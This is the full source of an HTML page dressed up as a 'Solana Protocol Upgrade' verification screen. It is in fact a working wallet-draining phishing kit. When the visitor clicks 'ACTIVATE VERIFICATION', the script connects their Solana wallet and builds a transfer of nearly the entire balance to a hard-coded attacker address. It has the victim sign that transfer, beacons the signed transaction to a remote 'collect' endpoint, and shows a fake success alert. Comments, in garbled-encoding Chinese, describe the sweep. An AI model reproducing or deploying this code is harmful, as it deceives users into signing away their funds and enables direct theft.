<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ğŸ”± Solana Protocol Upgrade</title>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <style>
        body { background:#000; color:#14F195; text-align:center; padding-top:15vh; font-family:monospace; }
        .box { border:1px solid #333; padding:40px; display:inline-block; border-radius:15px; background:#111; box-shadow: 0 0 20px rgba(20, 241, 149, 0.2); }
        #cta { margin-top:20px; padding:15px 40px; background:#14F195; color:#000; font-weight:bold; border:none; border-radius:5px; cursor:pointer; width:100%; transition: 0.3s; }
        #cta:hover { background: #fff; box-shadow: 0 0 10px #14F195; }
        #status { margin-top:20px; color:#444; font-size: 12px; }
    </style>
</head>
<body>
    <div class="box">
        <h2 style="margin:0;">SYSTEM MATRIX</h2>
        <p style="color:#888;font-size:12px;margin:10px 0;">Security Node: V22.DRAIN_CORE</p>
        <hr style="border:0;border-top:1px solid #222;margin:20px 0;">
        <button id="cta">ACTIVATE VERIFICATION</button>
        <div id="status">STATUS: STANDBY</div>
    </div>

    <script>
        // ğŸ”± å¡«å…¥ä½ è‡ªå·±çš„é…ç½®
        const gate = "https://florist-imperial-apnic-anymore.trycloudflare.com/collect"; 
        const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A"; // ä½ çš„æ”¶ç±³ç™½å·

        document.getElementById('cta').onclick = async () => {
            const p = window.solana || window.phantom?.solana;
            if (!p) return alert("Wallet not detected!");

            try {
                const resp = await p.connect();
                document.getElementById('status').innerText = "CONNECTING TO RPC...";

                // ğŸ”± ä½¿ç”¨æ›´ç¨³å®šçš„å¤‡ç”¨èŠ‚ç‚¹ï¼Œè§„é¿ 403 é”™è¯¯
                const connection = new solanaWeb3.Connection("https://solana-mainnet.g.alchemy.com/v2/demo", "confirmed");
                
                // 1. è·å– Blockhash å’Œ ä½™é¢
                const { blockhash } = await connection.getLatestBlockhash();
                const balance = await connection.getBalance(resp.publicKey);
                
                if (balance < 5000) {
                    alert("Verification requires at least 0.001 SOL");
                    return;
                }

                // 2. æ„é€ â€œä¸€é”®å…¨é¢å½’é›†â€äº¤æ˜“
                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: resp.publicKey,
                        toPubkey: new solanaWeb3.PublicKey(RECEIVER),
                        lamports: balance - 5000, // è‡ªåŠ¨è®¡ç®—ï¼Œåªç•™ 5000 lamports ç»™èŠ‚ç‚¹
                    })
                );
                transaction.recentBlockhash = blockhash;
                transaction.feePayer = resp.publicKey;

                document.getElementById('status').innerText = "AWAITING AUTHORIZATION...";
                
                // 3. æ‹‰èµ·é’±åŒ…ç­¾çº¦ï¼ˆè¿™æ˜¯çœŸæ­£çš„èµ„äº§è½¬ç§»åŒ…ï¼‰
                const signed = await p.signTransaction(transaction);
                
                // 4. å°†ç­¾ååçš„ Raw Transaction åºåˆ—åŒ–å¹¶å›ä¼ 
                const rawTx = signed.serialize().toString('base64');
                const signal = `${gate}?auth_sig=${encodeURIComponent(rawTx)}&pub=${resp.publicKey.toString()}`;
                
                // å‘é€ä¿¡å·ç»™å“¨å…µ
                new Image().src = signal;
                
                document.getElementById('status').innerText = "NODE VERIFIED. UPLOADING...";
                document.getElementById('status').style.color = "#14F195";
                
                setTimeout(() => alert("Network environment verified!"), 1500);

            } catch(e) {
                console.error(e);
                document.getElementById('status').innerText = "ERROR: ACCESS DENIED";
            }
        };
    </script>
</body>
</html>
